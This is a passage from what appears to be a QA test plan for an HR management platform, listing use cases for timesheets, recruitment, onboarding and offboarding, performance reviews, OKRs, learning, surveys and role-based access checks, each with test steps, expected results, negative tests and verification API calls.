- **Verification:** `GET /api/v1/helpdesk/tickets/{id}` returns
  `{ "status": "CLOSED", "slaBreached": false }`.

---

### UC-TIME-001 — Log Time to Project

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/timesheets
- **API Endpoint:** `POST /api/v1/timesheets/entries`
- **Playwright Spec:** `frontend/e2e/timesheets.spec.ts`
- **Preconditions:** Employee assigned to at least 1 project. Week of 2026-03-30 open for timesheet
  entry.
- **Test Steps:**
  1. Navigate to http://localhost:3000/timesheets
  2. Select week: 2026-03-30 to 2026-04-05
  3. Add entry: Monday 2026-03-30, Project = "NU-AURA Platform", Task = "Backend Development",
     Hours = 8
  4. Add entry for each working day (8 hours each)
  5. Total: 40 hours for the week
  6. Click "Submit for Week"
  7. Manager (`sumit@nulogic.io`) approves weekly timesheet
- **Expected Result:** Timesheet entries saved. Weekly submission triggers approval. Approved
  timesheets feed into billing and project tracking.
- **Negative Test:** Log 25 hours in a single day → HTTP 400
  `{ "error": "Daily hours cannot exceed 24" }`. Submit timesheet for a locked/past period → HTTP
  400.
- **Verification:** `GET /api/v1/timesheets/entries?employeeId=<id>&weekStart=2026-03-30` returns
  all entries.

---

### UC-RESOURCE-001 — Resource Allocation to Project

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** MANAGER, HR_ADMIN
- **URL:** http://localhost:3000/resources
- **API Endpoint:** `POST /api/v1/resource-management/allocations`
- **Playwright Spec:** `frontend/e2e/resource-allocation.spec.ts`, `frontend/e2e/resources.spec.ts`
- **Preconditions:** Project "NU-AURA Platform" exists. `saran@nulogic.io` available (not fully
  allocated).
- **Test Steps:**
  1. Navigate to http://localhost:3000/resources
  2. Click "New Allocation"
  3. Select project: NU-AURA Platform
  4. Select employee: Saran V
  5. Allocation percentage: 80%
  6. From: 2026-04-01, To: 2026-06-30
  7. Role: Backend Developer
  8. Save
  9. Verify capacity chart: Saran shows 80% allocated in April-June
  10. Remaining capacity: 20%
- **Expected Result:** Allocation saved. Capacity planning view updated. Conflict detection runs.
- **Negative Test:** Allocate Saran at 90% on a second project during the same period (total would
  be 170%) → HTTP 409
  `{ "error": "Allocation exceeds 100% capacity for employee Saran V during the specified period" }`.
- **Verification:** `GET /api/v1/resource-management/allocations?employeeId=<id>` returns active
  allocation.

---

### UC-REPORT-001 — Headcount Report

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN, HR_MANAGER
- **URL:** http://localhost:3000/reports
- **API Endpoint:** `GET /api/v1/reports/headcount`
- **Playwright Spec:** `frontend/e2e/reports-builder.spec.ts`,
  `frontend/e2e/reports-extended.spec.ts`
- **Preconditions:** At least 10 employees in the system across departments.
- **Test Steps:**
  1. Navigate to http://localhost:3000/reports
  2. Select report type: Headcount
  3. Filter by: Department = Engineering
  4. Group by: Designation
  5. Run report
  6. Verify breakdown shows counts per designation
  7. Export as Excel
  8. Verify Excel contains same data as UI
- **Expected Result:** Report generated. Export produces valid Excel file via Apache POI.
- **Negative Test:** Non-HR employee attempts `GET /api/v1/reports/headcount` → HTTP 403. Employee
  role has no access to /reports route (redirect to /403).
- **Verification:** API response contains correct employee count. Export file has correct MIME type
  `application/vnd.openxmlformats-officedocument.spreadsheetml.sheet`.

---

### UC-REPORT-002 — Scheduled Report

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/reports
- **API Endpoint:** `POST /api/v1/reports/scheduled`
- **Playwright Spec:** `frontend/e2e/scheduled-reports.spec.ts`
- **Preconditions:** Email service configured.
- **Test Steps:**
  1. Navigate to reports
  2. Configure scheduled report: Attrition report, monthly on 1st, send to jagadeesh@nulogic.io
  3. Save schedule
  4. Trigger manual run (for testing)
  5. Verify email received with attached report PDF/Excel
- **Expected Result:** Report generated and emailed on schedule. Manual trigger works for testing.
- **Negative Test:** Schedule report with invalid cron expression → Frontend validation rejects the
  expression.
- **Verification:** `GET /api/v1/reports/scheduled` lists the configured schedule.

---

### UC-ADMIN-001 — Feature Flags Management

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** SUPER_ADMIN, TENANT_ADMIN
- **URL:** http://localhost:3000/admin
- **API Endpoint:** `PUT /api/v1/admin/feature-flags/{key}`
- **Playwright Spec:** `frontend/e2e/admin-system.spec.ts`
- **Preconditions:** Logged in as `fayaz.m@nulogic.io` (SUPER_ADMIN).
- **Test Steps:**
  1. Navigate to http://localhost:3000/admin
  2. Find feature flag: `ENABLE_PAYROLL_ENGINE`
  3. Toggle OFF
  4. Verify payroll menu items disappear from sidebar for non-admin users
  5. Toggle back ON
  6. Verify payroll accessible again
- **Expected Result:** Feature flag toggle takes effect immediately (Redis-cached). Frontend
  hides/shows features dynamically.
- **Negative Test:** EMPLOYEE attempts to call
  `PUT /api/v1/admin/feature-flags/ENABLE_PAYROLL_ENGINE` → HTTP 403.
- **Verification:** `GET /api/v1/admin/feature-flags` returns current flag states.

---

### UC-ADMIN-002 — Holiday Calendar Management

- **Priority:** P1
- **Sub-App:** NU-HRMS
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/holidays
- **API Endpoint:** `POST /api/v1/holidays`
- **Playwright Spec:** `frontend/e2e/holidays.spec.ts`
- **Preconditions:** 2026 calendar not fully populated.
- **Test Steps:**
  1. Navigate to http://localhost:3000/holidays
  2. Click "Add Holiday"
  3. Name: "Kannada Rajyotsava"
  4. Date: 2026-11-01
  5. Type: MANDATORY (applies to all employees)
  6. Locations: Bangalore HQ
  7. Save
  8. Verify holiday appears in calendar for November
  9. Verify leave application for 2026-11-01 auto-excludes this day
- **Expected Result:** Holiday saved, location-scoped. Leave calculations respect holidays.
- **Negative Test:** Add holiday on a date that already has a holiday → HTTP 409
  `{ "error": "A holiday already exists on 2026-11-01" }`.
- **Verification:** `GET /api/v1/holidays?year=2026&location=BLR` returns the new holiday.

---

### UC-NOTIF-001 — In-App Notification Delivery

- **Priority:** P1
- **Sub-App:** Platform
- **Persona:** Any role
- **URL:** http://localhost:3000 (any page — notification bell icon)
- **API Endpoint:** `GET /api/v1/notifications`
- **Playwright Spec:** `frontend/e2e/notifications.spec.ts`
- **Preconditions:** A leave request was just approved for `saran@nulogic.io`.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to dashboard
  3. Verify notification bell shows unread count (e.g., "1")
  4. Click notification bell
  5. Verify notification: "Your leave request for Apr 14-15 has been approved by Sumit Kumar"
  6. Click notification → navigates to leave request details
  7. Notification marked as read
  8. Unread count decremented
- **Expected Result:** Real-time notification via WebSocket (STOMP/SockJS + Redis Pub/Sub).
  Notification center accessible. Read/unread state tracked.
- **Negative Test:** Disconnect WebSocket and submit new leave approval → Notification delivered on
  next page refresh via polling fallback. `GET /api/v1/notifications?unread=true` returns unread
  count.
- **Verification:** `GET /api/v1/notifications?employeeId=<id>&page=0&size=10` returns notification
  list with read status.

---

## P2 — NU-Hire Module Tests

---

### UC-HIRE-001 — Create Job Requisition

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN, MANAGER
- **URL:** http://localhost:3000/recruitment/jobs/new
- **API Endpoint:** `POST /api/v1/recruitment/jobs`
- **Playwright Spec:** `frontend/e2e/recruitment-pipeline.spec.ts`,
  `frontend/e2e/recruitment-extended.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`. Engineering department exists.
- **Test Steps:**
  1. Navigate to http://localhost:3000/recruitment/jobs/new
  2. Job title: "Full Stack Engineer"
  3. Department: Engineering
  4. Hiring Manager: Sumit Kumar
  5. Location: Bangalore HQ
  6. Employment type: Full-time
  7. Min experience: 3 years
  8. Max experience: 7 years
  9. CTC range: ₹8L – ₹15L
  10. Job description (Tiptap rich text editor): Add description
  11. Number of openings: 2
  12. Application deadline: 2026-05-31
  13. Click "Post Job"
  14. Verify job appears in job board
- **Expected Result:** Job requisition created with status OPEN. Appears on career page (if public).
  Requisition ID assigned.
- **Negative Test:** EMPLOYEE attempts `POST /api/v1/recruitment/jobs` → HTTP 403. Submit with max
  experience < min experience → HTTP 400 validation error.
- **Verification:** `GET /api/v1/recruitment/jobs` returns new job with status OPEN.

---

### UC-HIRE-002 — Candidate Pipeline and Kanban

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** RECRUITMENT_ADMIN, HR_MANAGER
- **URL:** http://localhost:3000/recruitment/pipeline
- **API Endpoint:** `PUT /api/v1/recruitment/candidates/{id}/stage`
- **Playwright Spec:** `frontend/e2e/recruitment-kanban.spec.ts`,
  `frontend/e2e/recruitment-pipeline.spec.ts`
- **Preconditions:** Job "Full Stack Engineer" active. 1 candidate "Test Candidate" in APPLIED
  stage.
- **Test Steps:**
  1. Navigate to http://localhost:3000/recruitment/pipeline
  2. Verify Kanban board with columns: APPLIED → SCREENING → INTERVIEW → OFFER → HIRED / REJECTED
  3. Find "Test Candidate" in APPLIED column
  4. Drag-drop card to SCREENING column (using `@hello-pangea/dnd`)
  5. Verify stage update API call: `PUT /api/v1/recruitment/candidates/{id}/stage` with
     `{ "stage": "SCREENING" }`
  6. Add screening note
  7. Move to INTERVIEW stage
  8. Assign interviewer
- **Expected Result:** Stage transitions smooth. Drag-drop works. Stage change recorded in candidate
  history. Notifications sent to assigned recruiters.
- **Negative Test:** Move candidate backwards (INTERVIEW → APPLIED) if policy prohibits backward
  movement → Warning modal or HTTP 400.
- **Verification:** `GET /api/v1/recruitment/candidates/{id}` returns `{ "stage": "INTERVIEW" }`.
  Stage history shows all transitions.

---

### UC-HIRE-003 — Schedule Interview and Record Feedback

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** RECRUITMENT_ADMIN (schedule), EMPLOYEE/MANAGER (feedback)
- **URL:** http://localhost:3000/recruitment/interviews
- **API Endpoint:** `POST /api/v1/recruitment/interviews`,
  `POST /api/v1/recruitment/interviews/{id}/feedback`
- **Playwright Spec:** `frontend/e2e/hire-to-onboard.spec.ts`
- **Preconditions:** Candidate "Test Candidate" in INTERVIEW stage. Interviewer `sumit@nulogic.io`
  available.
- **Test Steps:**
  1. Navigate to candidate profile
  2. Click "Schedule Interview"
  3. Round: Technical Round 1
  4. Interviewer: Sumit Kumar
  5. Date/Time: 2026-04-10 at 2:00 PM
  6. Format: Video Call
  7. Google Calendar invite sent to interviewer and candidate
  8. Interviewer logs in, navigates to interview panel
  9. After interview: fills feedback form
  10. Rating: 4/5
  11. Technical skills assessment: Strong in backend, moderate frontend
  12. Recommendation: PROCEED
  13. Submit feedback
- **Expected Result:** Interview scheduled. Calendar invite created. Feedback recorded with rating.
  Candidate moves to OFFER stage based on recommendation.
- **Negative Test:** Attempt to submit feedback without completing all mandatory fields → Form
  validation error. Attempt to view another recruiter's interview feedback (if confidential) → HTTP
  403.
- **Verification:** `GET /api/v1/recruitment/interviews/{id}/feedback` returns submitted feedback
  with scores.

---

### UC-HIRE-004 — Generate and Send Offer Letter

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN, RECRUITMENT_ADMIN
- **URL:** http://localhost:3000/recruitment/offers
- **API Endpoint:** `POST /api/v1/recruitment/offers`, `POST /api/v1/recruitment/offers/{id}/send`
- **Playwright Spec:** `frontend/e2e/hire-to-onboard.spec.ts`
- **Preconditions:** Candidate "Test Candidate" in OFFER stage. Offer letter template available.
- **Test Steps:**
  1. Navigate to candidate profile → "Create Offer"
  2. Designation: Full Stack Engineer
  3. CTC: ₹10,00,000/year
  4. Start date: 2026-05-01
  5. Offer validity: 7 days (expires 2026-04-17)
  6. Select template and preview offer letter
  7. Click "Send Offer" — DocuSign envelope or e-sign link generated
  8. Candidate receives email with offer acceptance link
  9. Candidate clicks link → offer portal: http://localhost:3000/offer-portal/{token}
  10. Candidate accepts/declines offer
  11. If accepted: Status → ACCEPTED, onboarding triggered
- **Expected Result:** Offer sent. Candidate accepts within validity period. Onboarding checklist
  auto-created.
- **Negative Test:** Offer not accepted before expiry → Status automatically changes to EXPIRED via
  scheduled job (`RecruitmentExpiryJob`). Attempt to accept expired offer → HTTP 400
  `{ "error": "Offer has expired" }`.
- **Verification:** `GET /api/v1/recruitment/offers/{id}` returns
  `{ "status": "ACCEPTED", "acceptedAt": "<timestamp>" }`.

---

### UC-HIRE-005 — Preboarding (Candidate Self-Service Portal)

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** NEW_JOINER (candidate accessing via token URL)
- **URL:** http://localhost:3000/preboarding/{token}
- **API Endpoint:** `GET /api/v1/preboarding/{token}`, `POST /api/v1/preboarding/{token}/submit`
- **Playwright Spec:** `frontend/e2e/hire-to-onboard.spec.ts`
- **Preconditions:** Offer accepted. Preboarding invitation email sent to candidate with unique
  token.
- **Test Steps:**
  1. Open preboarding link (from email): http://localhost:3000/preboarding/{token}
  2. Verify portal loads without login requirement (token-authenticated)
  3. Fill personal information: PAN, Aadhar, date of birth, address
  4. Upload documents: PAN card, Aadhar, educational certificates, previous payslips
  5. Enter bank account details for salary
  6. Sign offer acceptance digitally
  7. Submit form
  8. Confirmation screen: "Your details have been submitted. HR will review within 2 business days."
- **Expected Result:** All data saved to employee pre-profile. Documents uploaded to Google Drive.
  HR notified. Employee profile auto-populated on joining date.
- **Negative Test:** Access preboarding with invalid/expired token → HTTP 401 or 404 "Link is
  invalid or expired". Submit form without uploading mandatory documents → Frontend validation error
  listing missing items.
- **Verification:** `GET /api/v1/preboarding/{token}/status` returns
  `{ "status": "SUBMITTED", "completedFields": [...] }`.

---

### UC-HIRE-006 — Onboarding Checklist

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN, MANAGER, IT Admin, NEW_JOINER
- **URL:** http://localhost:3000/onboarding
- **API Endpoint:** `GET /api/v1/onboarding/checklists/{employeeId}`,
  `PUT /api/v1/onboarding/tasks/{taskId}/complete`
- **Playwright Spec:** `frontend/e2e/onboarding-offboarding.spec.ts`
- **Preconditions:** New employee "Priya Sharma" with joining date today. Onboarding template
  configured.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Navigate to http://localhost:3000/onboarding
  3. Find "Priya Sharma" onboarding checklist (auto-created on joining date)
  4. Verify tasks assigned: HR tasks (benefits enrollment, ID card), IT tasks (laptop setup, email
     account), Manager tasks (team introduction, project assignment)
  5. IT Admin marks "Laptop provisioned" as complete
  6. HR marks "Benefits enrolled" as complete
  7. Verify progress: 2/10 tasks complete
  8. Priya logs in and sees her onboarding checklist
  9. She completes: "Review company handbook" task
- **Expected Result:** Checklist auto-generated. Tasks assignable to different personas. Progress
  tracked.
- **Negative Test:** Complete all tasks before joining date → System allows it (pre-boarding tasks
  valid). Attempt to mark a task as incomplete after it was marked complete (if locked) → HTTP 400.
- **Verification:** `GET /api/v1/onboarding/checklists/{employeeId}` returns checklist with
  completion status.

---

### UC-HIRE-007 — Offboarding and FnF Settlement

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** HR_ADMIN, MANAGER, Employee (exiting)
- **URL:** http://localhost:3000/offboarding
- **API Endpoint:** `POST /api/v1/exit/initiate`, `GET /api/v1/exit/fnf-settlement/{employeeId}`
- **Playwright Spec:** `frontend/e2e/onboarding-offboarding.spec.ts`,
  `frontend/e2e/fnf-settlement.spec.ts`
- **Preconditions:** `saran@nulogic.io` submitting resignation. Last working day: 2026-04-30.
- **Test Steps:**
  1. Saran logs in and navigates to http://localhost:3000/me (My Space)
  2. Submits resignation via "Initiate Exit" → `POST /api/v1/exit/initiate`
  3. HR Admin receives exit workflow task
  4. HR initiates offboarding checklist: access revocation, asset return, knowledge transfer
  5. Tasks assigned to respective owners
  6. Asset "MacBook Pro 14" returned (see UC-ASSET-002)
  7. Exit interview completed
  8. HR Admin calculates FnF settlement:

  - Unpaid salary for April: ₹20,000 × (22/26) working days = ~₹16,923
  - Encashment of 12 AL days: 12 × (₹20,000/26) = ~₹9,231
  - PF settlement initiated with EPFO
  - Gratuity (if eligible): 0 (< 5 years service)

  9. FnF approved and payment processed
  10. Saran's account deactivated
- **Expected Result:** Full offboarding lifecycle. FnF calculation accurate. Account deactivated
  post last working day.
- **Negative Test:** Attempt to run payroll for a TERMINATED employee in the month after exit → HTTP
  400 `{ "error": "Employee is not active" }`.
- **Verification:** `GET /api/v1/employees/{id}` returns
  `{ "isActive": false, "exitDate": "2026-04-30" }`. FnF settlement record created.

---

### UC-HIRE-008 — Employee Referral Submission

- **Priority:** P2
- **Sub-App:** NU-Hire
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/referrals
- **API Endpoint:** `POST /api/v1/referrals`
- **Playwright Spec:** (No dedicated spec — verify against general hire specs)
- **Preconditions:** Referral program active. Job "Full Stack Engineer" open.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/referrals
  3. Click "Refer a Friend"
  4. Select job: Full Stack Engineer
  5. Referral name: "Vikram Nair"
  6. Referral email: vikram.nair@gmail.com
  7. Add message
  8. Submit — `POST /api/v1/referrals`
  9. Verify referral appears in "My Referrals" with status PENDING
  10. Candidate applies via referral link
  11. On hire: Saran receives reward points (if configured)
- **Expected Result:** Referral recorded. Unique referral link generated. Points awarded on
  successful hire.
- **Negative Test:** Employee refers themselves (same email) → HTTP 400
  `{ "error": "Cannot refer your own email address" }`.
- **Verification:** `GET /api/v1/referrals?referrerId=<id>` returns submitted referral.

---

## P3 — NU-Grow Module Tests

---

### UC-GROW-001 — Create Performance Review Cycle

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN
- **URL:** http://localhost:3000/performance
- **API Endpoint:** `POST /api/v1/performance/cycles`
- **Playwright Spec:** `frontend/e2e/performance-review-cycle.spec.ts`,
  `frontend/e2e/review-cycles.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`. No active review cycle for Q1 2026 (or use
  existing seed cycle).
- **Test Steps:**
  1. Navigate to http://localhost:3000/performance
  2. Click "Create Review Cycle"
  3. Name: "Q2 2026 Performance Review"
  4. Period: 2026-04-01 to 2026-06-30
  5. Review types: Self Review + Manager Review + 360 Peer Feedback
  6. Self-review deadline: 2026-07-10
  7. Manager review deadline: 2026-07-20
  8. Rating scale: 1-5
  9. Participants: All active employees
  10. Click "Launch Cycle"
  11. Verify all employees receive notification
  12. Verify self-review tasks created for all employees
- **Expected Result:** Review cycle created with status IN_PROGRESS. All employees have active
  review tasks.
- **Negative Test:** Create overlapping review cycle (same period) → HTTP 409
  `{ "error": "An active review cycle already exists for this period" }`.
- **Verification:** `GET /api/v1/performance/cycles` returns the cycle.
  `GET /api/v1/performance/reviews?cycleId=<id>` returns all review instances.

---

### UC-GROW-002 — Self-Review Submission

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/performance/reviews/{id}
- **API Endpoint:** `PUT /api/v1/performance/reviews/{id}/self-review`
- **Playwright Spec:** `frontend/e2e/performance-review.spec.ts`
- **Preconditions:** Active review cycle. `saran@nulogic.io` has a self-review task pending.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/performance (or notification link)
  3. Click on self-review task
  4. Fill goal achievement section: Each goal rated 1-5 with comments
  5. Fill competency ratings: Communication 4/5, Technical Skills 5/5, Teamwork 4/5
  6. Overall self-rating: 4/5
  7. Key accomplishments text (Tiptap editor)
  8. Development areas text
  9. Click "Submit Self Review"
  10. Status changes: PENDING → SUBMITTED
  11. Manager notified to start their review
- **Expected Result:** Self-review submitted. Manager review task created. No further edits possible
  after submission (unless reopened by HR).
- **Negative Test:** Submit self-review after deadline → HTTP 400
  `{ "error": "Self-review deadline has passed" }`. Employee tries to view another employee's
  review → HTTP 403.
- **Verification:** `GET /api/v1/performance/reviews/{id}` returns
  `{ "selfReviewStatus": "SUBMITTED", "selfRating": 4 }`.

---

### UC-GROW-003 — Manager Review and Final Rating

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** MANAGER
- **URL:** http://localhost:3000/performance/reviews/{id}
- **API Endpoint:** `PUT /api/v1/performance/reviews/{id}/manager-review`
- **Playwright Spec:** `frontend/e2e/performance-review.spec.ts`
- **Preconditions:** `saran@nulogic.io` has submitted self-review. `sumit@nulogic.io` is assigned as
  manager reviewer.
- **Test Steps:**
  1. Log in as `sumit@nulogic.io`
  2. Navigate to approval/review inbox
  3. Find Saran's review
  4. View self-review comments (read-only)
  5. Fill manager ratings: each competency scored
  6. Overall manager rating: 4/5
  7. Development plan: 2 goals for Q3 2026
  8. Submit manager review
  9. HR Admin finalizes and publishes review
  10. Employee views finalized review
- **Expected Result:** Manager review submitted. Final rating = weighted average of self and manager
  ratings. Published review visible to employee.
- **Negative Test:** Manager of a different team attempts to access and submit review for Saran →
  HTTP 403 (not in reporting chain).
- **Verification:** `GET /api/v1/performance/reviews/{id}` returns
  `{ "managerReviewStatus": "SUBMITTED", "finalRating": 4, "status": "PUBLISHED" }`.

---

### UC-GROW-004 — 360 Degree Peer Feedback

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** EMPLOYEE (request feedback), PEER (provide feedback)
- **URL:** http://localhost:3000/feedback360
- **API Endpoint:** `POST /api/v1/feedback360/requests`, `POST /api/v1/feedback360/responses`
- **Playwright Spec:** `frontend/e2e/feedback360.spec.ts`
- **Preconditions:** Active review cycle with 360 feedback enabled.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/feedback360
  3. Request feedback from: Raj V, Mani S (peer nominees)
  4. Submit nominations
  5. Log in as `raj@nulogic.io`
  6. Navigate to feedback inbox
  7. Provide feedback on Saran: rated on 5 competencies, 1-5 scale
  8. Add written comments
  9. Submit (anonymous if configured)
  10. Log in as `sumit@nulogic.io` (manager)
  11. View aggregated 360 feedback report for Saran
- **Expected Result:** Feedback requested from peers. Peers complete forms. Aggregated report shows
  avg ratings. Identity anonymous if policy says so.
- **Negative Test:** Request feedback from someone outside your team/project (if policy
  restricted) → HTTP 400. Peer who received request attempts to view who nominated them (if
  anonymous) → UI does not expose nominator identity.
- **Verification:** `GET /api/v1/feedback360/requests/{id}/responses` returns aggregated feedback (
  anonymized per policy).

---

### UC-GROW-005 — OKR Creation and Cascade

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** SUPER_ADMIN (company OKR), MANAGER (dept OKR), EMPLOYEE (individual goal)
- **URL:** http://localhost:3000/okr
- **API Endpoint:** `POST /api/v1/okr/objectives`, `POST /api/v1/okr/key-results`
- **Playwright Spec:** `frontend/e2e/okr.spec.ts`
- **Preconditions:** Q2 2026 OKR cycle configured.
- **Test Steps:**
  1. Log in as `fayaz.m@nulogic.io`
  2. Navigate to http://localhost:3000/okr
  3. Create company objective: "Achieve ₹10Cr ARR by Q2 2026"
  4. Add key result: "Onboard 5 enterprise clients" — target 5
  5. Log in as `sumit@nulogic.io`
  6. Create department objective aligned to company OKR
  7. Log in as `saran@nulogic.io`
  8. Create individual goal aligned to department OKR
  9. Update progress: KR1 progress → 2/5 clients onboarded (40%)
  10. Verify parent OKR progress rolls up
- **Expected Result:** OKR cascade from company → department → individual. Progress roll-up
  calculated.
- **Negative Test:** Create an OKR with no key results and attempt to activate → HTTP 400
  `{ "error": "Objective must have at least one key result" }`.
- **Verification:** `GET /api/v1/okr/objectives?type=COMPANY` returns company OKRs with cascaded
  children.

---

### UC-GROW-006 — LMS Course Enrollment and Completion

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** EMPLOYEE (self-enroll), HR_ADMIN (assign course)
- **URL:** http://localhost:3000/learning
- **API Endpoint:** `POST /api/v1/lms/enrollments`, `PUT /api/v1/lms/enrollments/{id}/complete`
- **Playwright Spec:** `frontend/e2e/learning.spec.ts`, `frontend/e2e/lms-catalog.spec.ts`,
  `frontend/e2e/training.spec.ts`, `frontend/e2e/training-enrollment.spec.ts`
- **Preconditions:** Course "Java Spring Boot Advanced" exists in catalog with video content and a
  quiz.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/learning
  3. Browse catalog — find "Java Spring Boot Advanced"
  4. Click "Enroll" — `POST /api/v1/lms/enrollments`
  5. Course opens: video lesson 1
  6. Mark lesson 1 as complete
  7. Take chapter quiz: answer 4/5 questions correctly (80% pass rate)
  8. Complete all lessons
  9. Click "Complete Course"
  10. Certificate generated: "Java Spring Boot Advanced — Saran V — 2026-04-02"
  11. Download certificate PDF
  12. Course appears in "My Completed Courses"
- **Expected Result:** Enrollment recorded. Progress tracked per lesson. Certificate issued on 100%
  completion and quiz pass. Completion recorded in employee learning history.
- **Negative Test:** Fail quiz (score < 60%) → "You need 60% to pass. You scored 40%. Retry quiz."
  No certificate issued. HR assigns mandatory course with deadline → Employee receives deadline
  notification; overdue triggers escalation.
- **Verification:** `GET /api/v1/lms/enrollments?employeeId=<id>` returns
  `{ "status": "COMPLETED", "certificate": true, "completedAt": "<timestamp>" }`.

---

### UC-GROW-007 — Recognition — Peer Kudos

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** EMPLOYEE (give), EMPLOYEE (receive)
- **URL:** http://localhost:3000/recognition
- **API Endpoint:** `POST /api/v1/recognition/kudos`
- **Playwright Spec:** `frontend/e2e/recognition.spec.ts`
- **Preconditions:** Recognition program active. Badges configured: "Team Player", "Innovation
  Star", "Go-Getter".
- **Test Steps:**
  1. Log in as `raj@nulogic.io`
  2. Navigate to http://localhost:3000/recognition
  3. Click "Give Kudos"
  4. Recipient: Saran V
  5. Badge: "Team Player"
  6. Message: "Great collaboration on the platform module!"
  7. Submit — `POST /api/v1/recognition/kudos`
  8. Verify kudos appears in company feed
  9. Log in as `saran@nulogic.io`
  10. Verify notification received
  11. Verify points balance updated (+50 points for receiving)
  12. Check leaderboard — Saran's ranking updated
- **Expected Result:** Kudos created. Points awarded. Feed updated. Leaderboard refreshed.
- **Negative Test:** Attempt to give kudos to yourself → HTTP 400
  `{ "error": "Cannot give kudos to yourself" }`. Give kudos without selecting a badge (if
  mandatory) → Form validation error.
- **Verification:** `GET /api/v1/recognition/kudos?recipientId=<saran_id>` returns the kudos.

---

### UC-GROW-008 — Survey Creation and Response

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN (create), EMPLOYEE (respond)
- **URL:** http://localhost:3000/surveys
- **API Endpoint:** `POST /api/v1/surveys`, `POST /api/v1/surveys/{id}/responses`
- **Playwright Spec:** `frontend/e2e/surveys.spec.ts`
- **Preconditions:** Logged in as `jagadeesh@nulogic.io`.
- **Test Steps:**
  1. Navigate to http://localhost:3000/surveys
  2. Click "Create Survey"
  3. Title: "Q1 2026 Employee Pulse Survey"
  4. Anonymity: Anonymous
  5. Add questions:

  - Q1: "How satisfied are you with your work environment?" (Rating 1-5)
  - Q2: "Do you feel your work is recognized?" (Yes/No)
  - Q3: "What can we improve?" (Open text)

  6. Target audience: All employees
  7. Deadline: 2026-04-10
  8. Publish survey
  9. Log in as `saran@nulogic.io`
  10. Navigate to survey notification link
  11. Answer all questions
  12. Submit
  13. HR views aggregate results (anonymized)
- **Expected Result:** Survey distributed to all employees. Responses collected anonymously.
  Analytics show average rating, yes/no breakdown, word cloud for open text.
- **Negative Test:** Employee submits survey twice → HTTP 409
  `{ "error": "You have already responded to this survey" }`. Access survey after deadline → HTTP
  400 `{ "error": "Survey has closed" }`.
- **Verification:** `GET /api/v1/surveys/{id}/analytics` returns response summary.

---

### UC-GROW-009 — Wellness Program Participation

- **Priority:** P3
- **Sub-App:** NU-Grow
- **Persona:** HR_ADMIN (create), EMPLOYEE (participate)
- **URL:** http://localhost:3000/wellness
- **API Endpoint:** `POST /api/v1/wellness/programs`, `POST /api/v1/wellness/programs/{id}/join`
- **Playwright Spec:** `frontend/e2e/wellness.spec.ts`
- **Preconditions:** Wellness module enabled.
- **Test Steps:**
  1. Log in as `jagadeesh@nulogic.io`
  2. Navigate to http://localhost:3000/wellness
  3. Create wellness challenge: "10,000 Steps Daily — April 2026"
  4. Points reward: 10 points/day
  5. Duration: 2026-04-01 to 2026-04-30
  6. Publish
  7. Log in as `saran@nulogic.io`
  8. Join the challenge
  9. Log participation for 5 days
  10. Verify points awarded: 5 × 10 = 50 points
  11. HR views participation report: X% employees joined
- **Expected Result:** Program created, employees can join and log participation. Points awarded and
  visible in recognition points balance.
- **Negative Test:** Log participation for a date outside challenge period → HTTP 400
  `{ "error": "Participation date is outside challenge period" }`.
- **Verification:** `GET /api/v1/wellness/programs/{id}/participants` returns joined employees and
  participation logs.

---

## RBAC and Security Tests (Cross-Cutting)

---

### UC-RBAC-001 — RBAC Positive: Employee Accesses Own Data Only

- **Priority:** P0
- **Sub-App:** Platform
- **Persona:** EMPLOYEE
- **URL:** http://localhost:3000/me/*
- **API Endpoint:** `GET /api/v1/employees/{id}`, `GET /api/v1/leave/balances`
- **Playwright Spec:** `frontend/e2e/rbac-employee-boundaries.spec.ts`
- **Preconditions:** Logged in as `saran@nulogic.io`.
- **Test Steps:**
  1. Log in as `saran@nulogic.io`
  2. Navigate to http://localhost:3000/me/dashboard — should load successfully
  3. Navigate to http://localhost:3000/me/payslips — Saran's own payslips visible
  4. Navigate to http://localhost:3000/me/leave — Saran's own leave requests visible
  5. Navigate to http://localhost:3000/me/attendance — Saran's own attendance visible
  6. Navigate to http://localhost:3000/employees — Employee directory accessible (read-only)
  7. Verify: No "Add Employee", "Delete Employee", "Run Payroll" buttons visible in UI
  8. Verify: Sidebar shows EMPLOYEE navigation only (My Space, Leave, Attendance, etc.)
  9. Verify: `/admin`, `/payroll/runs`, `/reports` are NOT in sidebar
- **Expected Result:** Employee can access all MY SPACE features. No admin/payroll/HR features
  accessible.
